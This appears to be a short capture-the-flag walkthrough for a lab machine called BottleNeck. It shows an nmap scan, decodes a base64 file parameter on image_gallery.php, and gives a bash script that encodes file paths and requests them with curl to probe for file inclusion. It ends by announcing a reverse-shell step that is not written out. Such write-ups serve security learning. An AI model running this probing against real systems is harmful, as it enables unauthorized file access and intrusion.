# BottleNeck

Lets find out the IP of this Machine First ➡️

![Untitled](BottleNeck/Untitled.png)

```jsx
IP : 10.10.2.31
```

## Port Scan Results ➡️

![Untitled](BottleNeck/Untitled%201.png)

```bash
┌──(kali㉿kali)-[~/Downloads/Proving_Ground/Bottleneck]
└─$ **sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 10.0.2.31**   
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-21 09:27 IST
Nmap scan report for 10.0.2.31
Host is up (0.0011s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Ubuntu 10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 bee0d57576ead4f39177f947207dbfa4 (RSA)
|   256 7a3490c059d1db63bd4eca5e6feee72d (ECDSA)
|_  256 c9b966ce28adb7b3d9bbed220de445db (ED25519)
80/tcp open  http    nginx
|_http-title: BOTTLENECK
MAC Address: 08:00:27:62:05:74 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Web Enumeration ➡️

![Untitled](BottleNeck/Untitled%202.png)

![Untitled](BottleNeck/Untitled%203.png)

Now When I visited the page I encountered with this link ⤵️

   [http://10.0.2.31/image_gallery.php?t=1682050025&f=Ym90dGxlbmVja19kb250YmUucG5n](http://10.0.2.31/image_gallery.php?t=1682050025&f=Ym90dGxlbmVja19kb250YmUucG5n)

Now this link loads 2 things >>

1. t = `1682050025` > This is date in seconds .
2. f = `Ym90dGxlbmVja19kb250YmUucG5n` > This data is base64 encoded when we decode it we get `bottleneck_dontbe.png`

So here we have to create a automation script which loads the date in seconds and also takes an input for uploading the payload .

```bash
#!/bin/bash
t=$(date +%s)
f=$(echo -e -n $1 |base64 -w 0)
url="http://10.0.2.31/image_gallery.php?t=$t&f=$f"
echo $url
echo $(curl -s -vv "$url")
```

![Untitled](BottleNeck/Untitled%204.png)

Lets run this >>

Now From the web Browser we get this >>

![Untitled](BottleNeck/Untitled%205.png)

Now Lets try to load the reverse shell script from outside >>

![Untitled](BottleNeck/Untitled%206.png)